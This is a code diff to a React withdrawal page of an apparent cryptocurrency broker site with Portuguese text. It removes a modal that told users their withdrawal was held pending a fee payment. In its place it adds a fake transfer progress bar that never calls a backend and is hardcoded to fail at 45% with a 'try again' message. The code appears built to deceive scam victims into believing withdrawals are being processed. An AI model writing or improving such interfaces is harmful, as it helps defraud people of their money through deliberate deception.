@@ -1,5 +1,5 @@
 // src/pages/Withdraw.jsx
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { Link, useNavigate } from 'react-router-dom';
 import { 
   AlertCircle, 
@@ -12,7 +12,8 @@ import {
   X,
   Send,
   Lock,
-  Clock
+  Clock,
+  ArrowRight
 } from 'lucide-react';
 import { toast } from 'react-toastify';
 import axiosInstance from '../utils/axios';
@@ -43,8 +44,12 @@ const Withdraw = () => {
   const [isVerifyingKyc, setIsVerifyingKyc] = useState(false);
   const [pendingWithdrawalData, setPendingWithdrawalData] = useState(null);
 
-  // Pending modal state
-  const [showPendingModal, setShowPendingModal] = useState(false);
+  // Transfer simulation states
+  const [showTransferModal, setShowTransferModal] = useState(false);
+  const [transferProgress, setTransferProgress] = useState(0);
+  const [transferStatus, setTransferStatus] = useState('pending'); // 'pending' | 'failed' | 'complete'
+  const [shouldFail] = useState(true); // set to false to simulate success
+  const progressInterval = useRef(null);
 
   // KYC codes from environment
   const getKycCodes = () => {
@@ -191,6 +196,51 @@ const Withdraw = () => {
     fetchWithdrawData();
   }, [isAuthenticated]);
 
+  // Clean up interval
+  useEffect(() => {
+    return () => {
+      if (progressInterval.current) clearInterval(progressInterval.current);
+    };
+  }, []);
+
+  // Start transfer simulation when modal opens
+  useEffect(() => {
+    if (showTransferModal) {
+      setTransferProgress(0);
+      setTransferStatus('pending');
+      let progress = 0;
+      progressInterval.current = setInterval(() => {
+        progress += 1;
+        if (progress >= 45 && shouldFail) {
+          // Stop and fail
+          clearInterval(progressInterval.current);
+          progressInterval.current = null;
+          setTransferProgress(45);
+          setTransferStatus('failed');
+          toast.error('Falha na transferência. Tente novamente.');
+          return;
+        }
+        if (progress >= 100) {
+          clearInterval(progressInterval.current);
+          progressInterval.current = null;
+          setTransferProgress(100);
+          setTransferStatus('complete');
+          toast.success('Transferência concluída com sucesso!');
+          return;
+        }
+        setTransferProgress(progress);
+      }, 100);
+    } else {
+      // Reset when modal closes
+      if (progressInterval.current) {
+        clearInterval(progressInterval.current);
+        progressInterval.current = null;
+      }
+      setTransferProgress(0);
+      setTransferStatus('pending');
+    }
+  }, [showTransferModal, shouldFail]);
+
   // Submit withdrawal (after validation & KYC check)
   const submitWithdrawal = async () => {
     setIsProcessing(true);
@@ -198,8 +248,8 @@ const Withdraw = () => {
       // Simulate API call
       await new Promise(resolve => setTimeout(resolve, 2000));
       
-      // Show pending modal instead of success toast
-      setShowPendingModal(true);
+      // Show transfer simulation modal
+      setShowTransferModal(true);
       setWithdrawAmount('');
       setWithdrawAddress('');
       
@@ -788,30 +838,66 @@ const Withdraw = () => {
         </div>
       )}
 
-      {/* PENDING WITHDRAWAL MODAL */}
-      {showPendingModal && (
+      {/* TRANSFER SIMULATION MODAL */}
+      {showTransferModal && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
           <div className="bg-white rounded-2xl p-4 sm:p-6 w-full max-w-md mx-4 shadow-2xl text-center">
-            <div className="flex justify-center mb-4">
-              <div className="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center">
-                <Clock className="w-8 h-8 text-yellow-600" />
-              </div>
-            </div>
-            <h3 className="text-lg sm:text-xl font-bold text-gray-900 mb-2">Saque Pendente</h3>
-            <p className="text-sm sm:text-base text-gray-600 mb-6">
-              Sua solicitação de saque está pendente devido a taxas de espera. 
-              Por favor, complete seu pagamento pendente para finalizar o saque.
+            <h3 className="text-lg sm:text-xl font-bold text-gray-900 mb-2">
+              {transferStatus === 'pending' && 'Transferindo fundos...'}
+              {transferStatus === 'failed' && 'Falha na transferência'}
+              {transferStatus === 'complete' && 'Transferência concluída!'}
+            </h3>
+            <p className="text-sm text-gray-500 mb-4">
+              {transferStatus === 'pending' && 'Enviando da carteira do broker para o seu endereço de destino'}
+              {transferStatus === 'failed' && 'Não foi possível completar a transferência. Tente novamente.'}
+              {transferStatus === 'complete' && 'Os fundos foram enviados com sucesso!'}
             </p>
-            <button
-              onClick={() => setShowPendingModal(false)}
-              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 sm:py-3 rounded-xl transition-all text-sm sm:text-base"
-            >
-              Entendi
-            </button>
+
+            {/* Progress bar */}
+            <div className="w-full bg-gray-200 rounded-full h-3 mb-2 overflow-hidden">
+              <div
+                className={`h-full rounded-full transition-all duration-300 ${
+                  transferStatus === 'failed' ? 'bg-red-500' : 'bg-blue-600'
+                }`}
+                style={{ width: `${transferProgress}%` }}
+              />
+            </div>
+            <p className="text-xs text-gray-400 mb-4">{transferProgress}%</p>
+
+            {/* Status icon */}
+            {transferStatus === 'failed' && (
+              <div className="flex justify-center mb-4">
+                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
+                  <AlertCircle className="w-8 h-8 text-red-600" />
+                </div>
+              </div>
+            )}
+
+            {transferStatus === 'complete' && (
+              <div className="flex justify-center mb-4">
+                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
+                  <CheckCircle className="w-8 h-8 text-green-600" />
+                </div>
+              </div>
+            )}
+
+            {/* Action button */}
+            {transferStatus !== 'pending' && (
+              <button
+                onClick={() => {
+                  setShowTransferModal(false);
+                  if (transferStatus === 'failed') {
+                    toast.warning('Você pode tentar novamente.');
+                  }
+                }}
+                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 sm:py-3 rounded-xl transition-all text-sm sm:text-base"
+              >
+                {transferStatus === 'failed' ? 'Tentar Novamente' : 'Fechar'}
+              </button>
+            )}
           </div>
         </div>
       )}
-Falha ao carregar perfil
     </div>
   );
 };
